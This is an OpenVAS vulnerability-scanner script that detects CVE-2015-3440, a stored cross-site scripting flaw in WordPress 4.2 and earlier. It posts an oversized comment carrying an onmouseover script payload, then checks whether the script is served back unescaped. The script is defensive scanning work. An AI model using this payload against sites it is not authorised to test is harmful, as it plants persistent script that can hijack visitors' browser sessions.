###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_comments_stored_xss_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Wordpress Comments Stored Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805176");
  script_version("$Revision: 13659 $");
  script_cve_id("CVE-2015-3440");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-05-04 18:50:27 +0530 (Mon, 04 May 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Wordpress Comments Stored Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Wordpress
  and is prone to stored XSS vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to execute script or not.");

  script_tag(name:"insight", value:"Flaw is due to the program which does not
  validate input to truncated blog comments before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to create a specially crafted request that would execute arbitrary
  script code in a user's browser session within the trust relationship between
  their browser and the server.");

  script_tag(name:"affected", value:"Wordpress version 4.2 and prior.");

  script_tag(name:"solution", value:"Upgrade to version 4.2.1 or higher.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/36844");
  script_xref(name:"URL", value:"https://wpvulndb.com/vulnerabilities/7945");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/535370");

  script_category(ACT_DESTRUCTIVE_ATTACK); # Stored XSS
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://wordpress.org");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name( port:http_port );

A = crap(length:81847, data:"A");

## Url to post comment
url = dir + "/wp-comments-post.php";

## Coinstruct POST data with A's
postdata = string("author=aaa&email=aaa%40aaa.com&url=http%3A%2F%2Faaa&comment",
                  "=%3Ca+title%3D%27x+onmouseover%3Dalert%28unescape%28%2Fhell",
                  "o%2520world%2F.source%29%29%0D%0Astyle%3Dposition%3Aabsolut",
                  "e%3Bleft%3A0%3Btop%3A0%3Bwidth%3A5000px%3Bheight%3A5000px%0D%0AAA", A,
                  "AAA%27%3E%3C%2Fa%3E&submit=Post+Comment&comment_post_ID=1&comment_parent=0");

sndReq =  string('POST ', url, ' HTTP/1.1\r\n',
                 'Host: ', host, '\r\n',
                 'User-Agent: ', useragent, '\r\n',
                 'Content-Type: application/x-www-form-urlencoded\r\n',
                 'Content-Length: ', strlen(postdata), '\r\n\r\n',
                 postdata);

rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:FALSE);

## This error message will come for fixed version
if("ERROR</strong>: The comment could not be saved" >< rcvRes) exit(0);

if(rcvRes =~ "HTTP/1.. 302 Found" && "comment_author_" >< rcvRes)
{
  comment_author = eregmatch(pattern:"comment_author_([0-9a-z]*)=aaa;", string:rcvRes);
  comment_author_email = eregmatch(pattern:"comment_author_email_([0-9a-z]*)=aaa%40aaa.com;", string:rcvRes);
  comment_author_url = eregmatch(pattern:"comment_author_url_([0-9a-z]*)=http%3A%2F%2Faaa;", string:rcvRes);

  if(comment_author[0] && comment_author_email[0] && comment_author_url[0])
  {
    cookie = string(comment_author[0], " ", comment_author_email[0], " ",
                    comment_author_url[0], "wp-settings-1=mfold%3Do; wp-settings-time-1=1427199392");

    ## Url to check Comment added
    comment_url = dir + "/?p=1";

    newReq = string("GET ", comment_url," HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", useragent, "\r\n",
                    "Cookie: ", cookie, "\r\n\r\n");

    newRes = http_send_recv(port:http_port, data:newReq, bodyonly:FALSE);

    if(newRes =~ "HTTP/1\.. 200" && "alert(unescape(/hello%20world" >< newRes &&
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" >< newRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
